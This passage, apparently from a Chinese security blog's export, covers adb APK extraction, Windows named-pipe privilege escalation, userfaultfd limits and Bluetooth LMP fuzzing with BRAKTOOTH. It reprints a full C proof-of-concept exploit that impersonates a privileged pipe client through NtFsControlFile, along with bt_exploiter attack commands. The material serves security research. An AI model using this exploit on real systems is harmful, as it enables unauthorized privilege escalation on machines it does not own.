package_list:</span><br><span class="line">            temp = package.decode(<span class="string">&#x27;utf-8&#x27;</span>).split(<span class="string">&#x27;:&#x27;</span>)[<span class="number">1</span>]</span><br><span class="line">            path = temp.rsplit(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">0</span>]</span><br><span class="line">            package_name = temp.rsplit(<span class="string">&#x27;=&#x27;</span>, <span class="number">1</span>)[<span class="number">1</span>]</span><br><span class="line">            <span class="built_in">print</span>(path)</span><br><span class="line">            <span class="built_in">print</span>(package_name)</span><br><span class="line">            cmd = <span class="string">&quot;adb pull &quot;</span> + path + <span class="string">&quot; &quot;</span> + out_dir + <span class="string">&quot;//&quot;</span> + package_name + <span class="string">&quot;.apk&quot;</span></span><br><span class="line">            result = subprocess.Popen(cmd, shell=<span class="literal">True</span>, stdout=subprocess.PIPE, stderr=subprocess.PIPE).communicate()</span><br><span class="line">            <span class="built_in">print</span>(result)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;Done&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># Press the green button in the gutter to run the script.</span></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    package_list = getAPKs()</span><br><span class="line">    pull_apk_from_device(package_list,<span class="string">&quot;/home/lzy/Pixel4XL_android13/APKs&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在实际使用过程中，请将路径“&#x2F;home&#x2F;lzy&#x2F;Pixel4XL_android13&#x2F;APKs”替换为您实际使用对路径。</p>]]></content>
      
      
      <categories>
          
          <category> 工具脚本 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Window命名管道的新提权方式</title>
      <link href="/2023/05/16/Windows-namedpipe-attacksurface/"/>
      <url>/2023/05/16/Windows-namedpipe-attacksurface/</url>
      
        <content type="html"><![CDATA[<h2 id="关于命名管道"><a href="#关于命名管道" class="headerlink" title="关于命名管道"></a>关于命名管道</h2><p>对于命名管道的攻击模式有很多，而且已经有研究者对管道的攻击面进行了深入的<a href="https://csandker.io/2021/01/10/Offensive-Windows-IPC-1-NamedPipes.html">分析</a>,其中，有一个比较重要的攻击模式是impersonate（模拟）管道客户端，但为了能模拟客户端的身份执行操作，通常需要模拟者调用ImpersonateNamedPipeClient这个API，并且具有seImpersonate特权，该特权通常需要管理员或者local network cservie的权限，这无疑给提权带来了一定的难度。</p><h2 id="新的提权方式"><a href="#新的提权方式" class="headerlink" title="新的提权方式"></a>新的提权方式</h2><p>最近看到乔纳森约翰逊发布了一篇<a href="https://posts.specterops.io/exploring-impersonation-through-the-named-pipe-filesystem-driver-15f324dfbaf2">博客</a>,该博客最大的亮点是不需要调用ImpersonateNamedPipeClient这个API，直接通过NtFsControlFile给管道对象下发控制码：FSCTL_PIPE_IMPERSONATE（0x11001C），那么，当特权进程来连接管道时候，就可以获得该特权对权限。<br>检查乔纳森约翰逊提供的<a href="https://github.com/jsecurity101/RandomPOCs/tree/main/NtfsControlFile">poc</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Windows.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;Lmcons.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fstream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sddl.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> FSCTL_PIPE_IMPERSONATE CTL_CODE(FILE_DEVICE_NAMED_PIPE, 7, METHOD_BUFFERED, FILE_ANY_ACCESS)</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> BUFSIZE 2048</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> INSTANCES 4 </span></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">OVERLAPPED oOverlap;</span><br><span class="line">HANDLE hPipeInst;</span><br><span class="line">TCHAR chRequest[BUFSIZE];</span><br><span class="line">DWORD cbRead;</span><br><span class="line">TCHAR chReply[BUFSIZE];</span><br><span class="line">DWORD cbToWrite;</span><br><span class="line">DWORD dwState;</span><br><span class="line">BOOL fPendingIO;</span><br><span class="line">&#125; PIPEINST, * LPPIPEINST;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">IO_STATUS_BLOCK</span> &#123;</span></span><br><span class="line"><span class="class"><span class="keyword">union</span> &#123;</span></span><br><span class="line">NTSTATUS Status;</span><br><span class="line">PVOID Pointer;</span><br><span class="line">&#125;;</span><br><span class="line">ULONG_PTR Information;</span><br><span class="line">&#125; IO_STATUS_BLOCK, * PIO_STATUS_BLOCK;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">enum</span> _<span class="title">EVENT_TYPE</span> &#123;</span></span><br><span class="line">NotificationEvent,</span><br><span class="line">SynchronizationEvent</span><br><span class="line">&#125; EVENT_TYPE;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">VOID</span><span class="params">(*PIO_APC_ROUTINE)</span><span class="params">(</span></span><br><span class="line"><span class="params">__in PVOID ApcContext,</span></span><br><span class="line"><span class="params">__in PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">__in ULONG Reserved</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">typedef</span> <span class="title function_">NTSTATUS</span><span class="params">(*_NtFsControlFile)</span><span class="params">(</span></span><br><span class="line"><span class="params">HANDLE FileHandle,</span></span><br><span class="line"><span class="params">HANDLE Event,</span></span><br><span class="line"><span class="params">PIO_APC_ROUTINE ApcRoutine,</span></span><br><span class="line"><span class="params">PVOID ApcContext,</span></span><br><span class="line"><span class="params">PIO_STATUS_BLOCK IoStatusBlock,</span></span><br><span class="line"><span class="params">ULONG FsControlCode,</span></span><br><span class="line"><span class="params">PVOID InputBuffer,</span></span><br><span class="line"><span class="params">ULONG InputBufferLength,</span></span><br><span class="line"><span class="params">PVOID OutputBuffer,</span></span><br><span class="line"><span class="params">ULONG OutputBufferLength</span></span><br><span class="line"><span class="params">)</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">HANDLE hPipe = <span class="literal">NULL</span>;</span><br><span class="line">DWORD i, dwRead;</span><br><span class="line">TCHAR chBuf[BUFSIZE];</span><br><span class="line">TCHAR username[UNLEN + <span class="number">1</span>];</span><br><span class="line">DWORD username_len = UNLEN + <span class="number">1</span>;</span><br><span class="line"><span class="keyword">if</span> (!GetUserName(username, &amp;username_len))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetUserName Failed (%d).\n&quot;</span>, GetLastError());</span><br><span class="line">DisconnectNamedPipe(hPipe);</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">wstring</span> username_w(username);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">username_s</span><span class="params">(username_w.begin(), username_w.end())</span>;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">cout</span> &lt;&lt; <span class="string">&quot;[*] Current username is: &quot;</span> &lt;&lt; username_s &lt;&lt; <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Creating named pipe npfs...\n&quot;</span>);</span><br><span class="line">    <span class="comment">//在实际的利用中，需要将这里的管道名称npfs替换为实际被攻击的管道名称</span></span><br><span class="line">hPipe = CreateNamedPipe(<span class="string">L&quot;\\\\.\\pipe\\npfs&quot;</span>, PIPE_ACCESS_DUPLEX | FILE_FLAG_OVERLAPPED, PIPE_TYPE_BYTE | PIPE_WAIT, <span class="number">10</span>, <span class="number">2048</span>, <span class="number">2048</span>, <span class="number">0</span>, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (hPipe == INVALID_HANDLE_VALUE)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] CreateNamedPipe failed: (%d).\n&quot;</span>, GetLastError());</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Named pipe created!\n&quot;</span>);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Waiting for client to connect...\n&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!ConnectNamedPipe(hPipe, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] ConnectNamedPipe failed: (%d).\n&quot;</span>, GetLastError());</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Client connected to named pipe!\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!ReadFile(hPipe, chBuf, BUFSIZE * <span class="keyword">sizeof</span>(TCHAR), &amp;dwRead, <span class="literal">NULL</span>)) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] ReadFile failed: (%d).\n&quot;</span>, GetLastError());</span><br><span class="line">DisconnectNamedPipe(hPipe);</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] ReadFile completed!\n&quot;</span>);</span><br><span class="line">                <span class="comment">//通过加载动态库ntdll.dll中的NtFsControlFile接口直接调用，绕过SeImpersonate权限检查</span></span><br><span class="line">_NtFsControlFile NtFsControlFile = (_NtFsControlFile)GetProcAddress(GetModuleHandle(<span class="string">L&quot;ntdll.dll&quot;</span>), <span class="string">&quot;NtFsControlFile&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (NtFsControlFile == <span class="literal">NULL</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtFsControlFile not found!\n&quot;</span>);</span><br><span class="line">DisconnectNamedPipe(hPipe);</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] NtFsControlFile found!\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">IO_STATUS_BLOCK ioStatusBlock;</span><br><span class="line">NTSTATUS status = NtFsControlFile(hPipe, <span class="literal">NULL</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>, &amp;ioStatusBlock, FSCTL_PIPE_IMPERSONATE, <span class="literal">NULL</span>, <span class="number">0</span>, <span class="literal">NULL</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">if</span> (status != <span class="number">259</span>) &#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[-] NtFsControlFile failed: (%d).\n&quot;</span>, GetLastError());</span><br><span class="line">DisconnectNamedPipe(hPipe);</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> &#123;</span><br><span class="line">WaitForSingleObject(hPipe, INFINITE);</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] NtFsControlFile completed!\n&quot;</span>);</span><br><span class="line"><span class="keyword">if</span> (!GetUserName(username, &amp;username_len))</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;GetUserName Failed (%d).\n&quot;</span>, GetLastError());</span><br><span class="line">DisconnectNamedPipe(hPipe);</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line"><span class="keyword">return</span> <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">wstring</span> username_w(username);</span><br><span class="line"><span class="built_in">std</span>::<span class="built_in">string</span> <span class="title function_">username_s</span><span class="params">(username_w.begin(), username_w.end())</span>;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[*] Current username is: %s\n&quot;</span>, username_s.c_str());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">DisconnectNamedPipe(hPipe);</span><br><span class="line">CloseHandle(hPipe);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>攻击代码很简单，只需要替换poc中的管道名称为实际被攻击的管道名称即可。<br>但如果进一步分析，这个漏洞利用模式是有限制的：这里的利用要求攻击者在被攻击的特权进程连接之前已经建立好命名管道服务端，也就是说，攻击者是伪造了一个管道服务端。如果该管道已经被创建，那么该利用方式就会失效。原因在于：当前微软虽然默认情况下允许创建同名的命名管道（在创建管道的时候可以设置不允许后续系统创建同名的管道），但却基于FIFO：客户端总是连接第一个创建的命名管道服务端而不会去连接后创建的管道服务端。</p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>虽然这种漏洞利用模式有一定的使用限制，但毫无疑问，这是一种新的提权方式，尤其那种不是随系统启动而创建管道的进程，攻击者完全可以在合法进程创建管道之前，抢先创建了同名的管道，一旦有特权进程来连接，立即可以获得特权进程的权限，完成提权。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 提权 </tag>
            
            <tag> 命名管道 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>userfaultfd默认禁止非特权用户调用</title>
      <link href="/2023/05/09/userfaultdf-forbid-unprivileged-users/"/>
      <url>/2023/05/09/userfaultdf-forbid-unprivileged-users/</url>
      
        <content type="html"><![CDATA[<h2 id="userfaultfd技术"><a href="#userfaultfd技术" class="headerlink" title="userfaultfd技术"></a>userfaultfd技术</h2><p>userfaultfd提供给用户处理缺页异常的一个正常功能，最开始是用于虚拟机迁移场景。但后来不断被攻击者用于漏洞的利用：当发生page fault的时候，内核会暂停处理，等待用户对userfaultfd的回调处理完毕后再进行往下执行，利用这个暂停，攻击者就可以提高类似UAF的漏洞利用。因为UAF通常是多线程环境下产生的，为了稳定利用漏洞，攻击者需要在free之后，used之前替换目标的内存，利用suserfaultfd技术可以比较容易实现这一点。具体可以参考<a href="http://brieflyx.me/2020/linux-tools/userfaultfd-internals/">Linux Kernel Userfaultfd 内部机制探究</a></p><h2 id="userfaultfd限制"><a href="#userfaultfd限制" class="headerlink" title="userfaultfd限制"></a>userfaultfd限制</h2><p>在2019年，有人提交了一个<a href="https://lwn.net/Articles/782745/">补丁</a>对userfaultfd的使用进行了限制</p><img src="/2023/05/09/userfaultdf-forbid-unprivileged-users/userfaultfd_unprivileaged_users.png" class title="userfaultfd限制"><p>因此，在我们的漏洞利用中，建议先通过命令</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat /proc/sys/vm/unprivileged_userfaultfd</span><br></pre></td></tr></table></figure><p>检查是否允许非特权用户调用userfaultfd</p><img src="/2023/05/09/userfaultdf-forbid-unprivileged-users/userfaultfd_disable.png" class title="userfaultfd禁用"><p>0表示禁用，这种情况下，只能通过其它方式进行漏洞利用了。</p>]]></content>
      
      
      <categories>
          
          <category> 漏洞利用 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> userfaultfd </tag>
            
            <tag> 特权用户 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用ESP开发板进行蓝牙的Fuzz测试</title>
      <link href="/2023/04/26/bluetooth-fuzz/"/>
      <url>/2023/04/26/bluetooth-fuzz/</url>
      
        <content type="html"><![CDATA[<h2 id="蓝牙（Bluetooth）介绍"><a href="#蓝牙（Bluetooth）介绍" class="headerlink" title="蓝牙（Bluetooth）介绍"></a>蓝牙（Bluetooth）介绍</h2><p>蓝牙是一个短距离（99%的设备蓝牙传输距离在10米和20米之间，特殊设备可达300米）的无线传输技术，使用2.4Ghz频段，也即是ISM免认证频段上。从1998年对1.0版本到2021年的5.3版本，经历了5代，十几个版本：</p><img src="/2023/04/26/bluetooth-fuzz/bluetooth_standar.png" class title="蓝牙发展历史"><p>注：2022年发布了最新的蓝牙5.4标准。<br>从应用和支持协议蓝牙可以划分成经典蓝牙BT和低功耗蓝牙BLE：<br>经典蓝牙一般4.0以下的版本，通常用于数据量较大的传输，比如语音，音乐。经典蓝牙根据传输速度又可以进一步划分为传统蓝牙和高速蓝牙。其中传统蓝牙一般是指蓝牙2.1及以下版本，而高速蓝牙是指2009年后推出对3.0版本，速率可高达24Mbps。</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth.png" class title="经典蓝牙"><p>低功耗蓝牙则是4.0及以上的版本，成本和功耗低是其最大的特点，但速率一般较低，通常用于遥控类设备，比如鼠标键盘，传感器数据传输，比如心跳，血压，温度。</p><img src="/2023/04/26/bluetooth-fuzz/BLE_bluetooth.png" class title="低功耗蓝牙"><p>注：目前不少蓝牙设备都是双模架构，也即是同时支持经典蓝牙和低功耗蓝牙两种模式。</p><h2 id="经典蓝牙协议栈"><a href="#经典蓝牙协议栈" class="headerlink" title="经典蓝牙协议栈"></a>经典蓝牙协议栈</h2><p>不少设备当前主要使用经典蓝牙进行数据传输，因此本文仅关注经典蓝牙的安全测试。</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_stack.png" class title="蓝牙协议栈"><p>与OSI参考模型类似，蓝牙协议栈也有物理层，链路层，传输层等类似的概念。但对于一个具体对蓝牙设备来说，它可能会根据实际需要仅实现或者使用协议栈对部分协议，但物理层和链路层是必不可少的。而且蓝牙一个关键安全机制–配对就发生在链路层，也即是链路管理协议LMP。</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_pair.png" class title="配对流程"><p>选择LMP协议进行fuzz测试的意义在于：不需要关注上层的业务逻辑，而且对于可被发现对蓝牙设备来说，都会处理LMP协议的报文。而越上层的协议，与业务越密切，在进行fuzz测试时候可能需要进行一定的操作才能触发相应的代码分支。理想情况下，我们希望能找到0-click控制蓝牙设备或者给蓝牙设备造成DOSg攻击。</p><h2 id="攻击场景"><a href="#攻击场景" class="headerlink" title="攻击场景"></a>攻击场景</h2><p>与<a href="https://asset-group.github.io/disclosures/braktooth/">BRAKTOOTH</a>一样，我们假设的攻击场景也是：</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_attack_scenario.png" class title="攻击场景"><p>目标设备是被攻击对对象，而攻击者通常拥有自己的PC+定制开发对设备，这里是ESP-WROVER-KIT开发板</p><img src="/2023/04/26/bluetooth-fuzz/ESP-WROVER-KIT.png" class title="ESP32开发板"><p>ESP32开发板可以从京东或者淘宝上购买。<br>之所以选择ESP32开发板，是因为在进行蓝牙协议fuzz的时候，我们需要能够注入畸形报文内容。为了实现这个目的，有两种方法：<br>1 直接修改ESP32的固件代码<br>具体可以参考BRAKTOOTH作者提供的esp32_firmware_patching_framework框架<br>2 在exploit模块下新增自己的功能模块，在运行exploit时候将会自动编译并加载<br>这种方式比较简单，适合小白入手^_^</p><h2 id="Fuzz环境搭建"><a href="#Fuzz环境搭建" class="headerlink" title="Fuzz环境搭建"></a>Fuzz环境搭建</h2><h3 id="操作系统准备"><a href="#操作系统准备" class="headerlink" title="操作系统准备"></a>操作系统准备</h3><p>BRAKTOOTH支持ubuntu 18.04和20.04,其中ubuntu系统可以安装在物理机上，也支持使用VMware安装，VirtualBox没有测试过。<br>但经过测试发现，如果使用虚拟机，经常会出现找不到USB设备的情况（ESP32开发板通过USB连接测试PC），导致Fuzz测试中断。原因是在Fuzz测试过程中，一方面对USB的响应延迟有要求，另一方面VMware虚拟软件对USB3.1对支持似乎也不是很稳定，经常莫名其妙就异常无法找打USB设备。<br>注：也曾想使用微软的WSL安装ubuntu，然后进行Fuzz，但经过实践，WSL下安装的ubuntu还比不上VMware，直接识别不到ESP32开发板。<br>最后，直接重装一台ubuntu20.04的物理机，从而可以稳定地进行Fuzz测试。</p><h3 id="软件环境准备"><a href="#软件环境准备" class="headerlink" title="软件环境准备"></a>软件环境准备</h3><p>不建议通过git clone方式将BRAKTOOTH从github上克隆下来，而是通过release页码直接<a href="https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks/releases/tag/v1.0.1">下载</a>：</p><img src="/2023/04/26/bluetooth-fuzz/BRAKTOOTH_release_package.png" class title="直接下载release包"><p>下载后，根据指导进行解压安装即可：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install unzip python3-dev</span><br><span class="line">unzip esp32driver.zip</span><br><span class="line">cd release</span><br><span class="line">python3 firmware.py /dev/ttyUSB0</span><br></pre></td></tr></table></figure><p>在执行python3 firmware.py &#x2F;dev&#x2F;ttyUSB0，需要按下开发板上对boot按钮，否在会提上无法刷入。<br>最后，解压wdissector测试套：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo apt install zstd</span><br><span class="line">tar -I zstd -xf wdissector.tar.zst</span><br></pre></td></tr></table></figure><h2 id="开始Fuzz测试"><a href="#开始Fuzz测试" class="headerlink" title="开始Fuzz测试"></a>开始Fuzz测试</h2><p>在没有进行任何定制的情况下，这时候，可以直接使用bt_fuzzer进行测试：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bin/bt_fuzzer</span><br></pre></td></tr></table></figure><p>以上是有GUI界面的fuzzer：</p><img src="/2023/04/26/bluetooth-fuzz/classic_bluetooth_bt_fuzzer.png" class title="bt_fuzzer"><p>界面上有各种配置参数，包括fuzz变异参数，是否实时抓包等。<br>具体可以参考BRAKTOOTH详细<a href="https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks/blob/master/README.pdf">文档</a></p><h2 id="定制报文"><a href="#定制报文" class="headerlink" title="定制报文"></a>定制报文</h2><p>HBRAKTOOTH除了提供bt_fuzzer外，也提供了一个漏洞利用框架bin&#x2F;exploiter，比如，可以执行：</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo bin/bt_exploiter --host-port=/dev/ttyUSB1 --target=b0:81:01:96:48:a5 --exploit=lmp_invalid_transport</span><br></pre></td></tr></table></figure><p>执行LMP异常transport报文的fuzz。<br>我们参考exploit开发<a href="https://github.com/Matheus-Garbelini/braktooth_esp32_bluetooth_classic_attacks/blob/master/exploit_modules_tutorial.pdf">文档</a>简单做一个demo。<br>基本上demo只需要实现框架制定对6个接口：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">extern</span> <span class="type">const</span> <span class="type">char</span> *<span class="title function_">module_name</span><span class="params">()</span>; <span class="comment">//返回模块名称，其实可以随意返回任意字符串即可</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">setup</span><span class="params">(<span class="type">void</span> *p)</span>;        <span class="comment">//模块初始化处理，通常是一些参数的设置</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">tx_pre_dissection</span><span class="params">(<span class="type">uint8_t</span> *pkt_buf, <span class="type">int</span> pkt_length, <span class="type">void</span> *p)</span>;  <span class="comment">//发送报文前预处理，比如可以修改报文对内容，可以直接return 0（不进行任何处理）</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">tx_post_dissection</span><span class="params">(<span class="type">uint8_t</span> *pkt_buf, <span class="type">int</span> pkt_length, <span class="type">void</span> *p)</span>; <span class="comment">//发送报文后的处理，可以直接return 0（不进行任何处理）</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">rx_pre_dissection</span><span class="params">(<span class="type">uint8_t</span> *pkt_buf, <span class="type">int</span> pkt_length, <span class="type">void</span> *p)</span>;  <span class="comment">//接收报文前预处理，可以直接return 0（不进行任何处理）</span></span><br><span class="line"><span class="keyword">extern</span> <span class="type">int</span> <span class="title function_">rx_post_dissection</span><span class="params">(<span class="type">uint8_t</span> *pkt_buf, <span class="type">int</span> pkt_length, <span class="type">void</span> *p)</span>; <span class="comment">//接收报文后处理，可以直接return 0（不进行任何处理）</span></span><br></pre></td></tr></table></figure><p>1 切换到目录：wdissector&#x2F;modules&#x2F;exploits&#x2F;bluetooth下，拷贝一个现有cpp文件，并重命名为一个合适的文件，比如lzy_pair.cpp<br>2 打开lzy_pair.cpp<br>  执行以下修改：<br>  1）将以上6个接口前的static关键字删除，否在编译报错<br>  